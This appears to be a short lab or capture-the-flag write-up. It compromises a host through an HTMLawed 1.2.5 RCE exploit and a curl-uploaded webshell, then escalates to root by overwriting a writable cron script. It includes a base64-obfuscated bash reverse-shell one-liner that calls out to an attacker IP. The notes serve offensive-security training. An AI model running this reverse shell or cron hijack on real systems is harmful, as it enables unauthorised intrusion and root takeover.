starting with nmap scan, only http and ssh are open
opening HTTP service lands me in a landing page for `HTMLawed 1.2.5`
![[Pasted image 20251106174359.png]]
searching for it on google reveals a [RCE exploit](https://www.exploit-db.com/exploits/52023) on exploit.db
i confirm code execution with curl and python http server, because the exploit doesnt retrieve output.
normal revshell payloads fail, i attempt to upload a webshell with curl and access it through the browser which works.
from my webshell i get a revshell with simple base64 payload `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxMy80NDMgMD4mMQ== | base64 -d | bash`
in the home directory of `www-data` there is a script that i have write permissions on called `cleanup.sh`, by uploading `pspy` to the target host and running it for a bit, i can confirm that this script is being executed every minute
![[Pasted image 20251106174721.png]]
![[Pasted image 20251106174740.png]]
i make my own `cleanup.sh` on my kali host, and download it with curl to the target, directly into the dir holding the current `cleanup.sh` this essentially overwrites the current script with my own version
![[Pasted image 20251106174944.png]]
![[Pasted image 20251106175019.png]]
after a minute i check `/bin/bash` 
![[Pasted image 20251106175051.png]]
now i can become root whenever i want with `bash -p -i` 
